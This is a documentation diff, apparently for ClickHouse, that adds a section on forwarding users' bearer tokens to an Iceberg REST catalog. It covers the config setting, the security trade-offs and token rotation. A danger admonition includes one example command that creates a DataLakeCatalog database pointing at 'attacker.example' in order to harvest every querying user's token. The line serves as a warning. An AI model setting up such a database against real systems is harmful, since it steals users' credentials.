@@ -300,6 +300,48 @@ To reduce number of requests to IdP, tokens are cached internally for a maximum 
 If token expires sooner than `token_cache_lifetime`, then cache entry for this token will only be valid while token is valid.
 If token lifetime is longer than `token_cache_lifetime`, cache entry for this token will be valid for `token_cache_lifetime`. 
 
+## Forwarding the token to external services {#token-forwarding}
+
+By default the bearer token a user authenticated with is destroyed as soon as authentication
+succeeds: it lives only on the stack of the HTTP or native protocol handler and reaches neither
+the session nor the query context.
+
+Setting `enable_token_forwarding` to `1` in `config.xml` keeps the token on the session so it can
+be presented to an external service on the user's behalf:
+
+```xml
+<enable_token_forwarding>1</enable_token_forwarding>
+```
+
+The only consumer today is the [`DataLakeCatalog`](/engines/database-engines/datalakecatalog)
+database engine, whose `oauth_forward_user_token` setting makes an Iceberg REST catalog authorize
+the human running the query instead of a shared service principal. See
+[Forwarding the user's identity to the catalog](/engines/database-engines/datalakecatalog#user-token-forwarding)
+for the database side.
+
+The setting is hot-reloadable, and is `false` by default because it widens where the secret lives:
+without it the only copy is the private token cache inside `ExternalAuthenticators`, with it the
+token is reachable from any storage or table function that receives the query context.
+
+:::danger `CREATE DATABASE` becomes a privileged operation
+A forwarded token is sent to a URL chosen by whoever created the database it is forwarded for.
+With forwarding enabled, the right to run
+`CREATE DATABASE d ENGINE = DataLakeCatalog('https://attacker.example/')` is the right to harvest
+the bearer token of every user who queries that database. Grant it accordingly, and keep
+`remote_url_allow_hosts` restrictive -- it is enforced on the token-exchange endpoint as well as
+on catalog requests.
+:::
+
+What is forwarded is always the token that was actually verified for this session. It is
+deliberately not carried in `ClientInfo`, so it is not copied into a context rebuilt by
+`EXECUTE AS` or by a DEFINER view, cannot be supplied by a peer over the interserver protocol, and
+is never serialized to the wire or to disk.
+
+Because HTTP re-authenticates on every request, a rotated token takes effect on the next query. A
+native TCP connection authenticates once during the handshake, so a long-running
+`clickhouse-client --jwt` session keeps presenting the token it connected with and must reconnect
+to pick up a fresh one.
+
 ## Enabling token authentication for a user in `users.xml` {#enabling-jwt-auth-in-users-xml}
 
 In order to enable token-based authentication for the user, specify `jwt` section instead of `password` or other similar sections in the user definition.
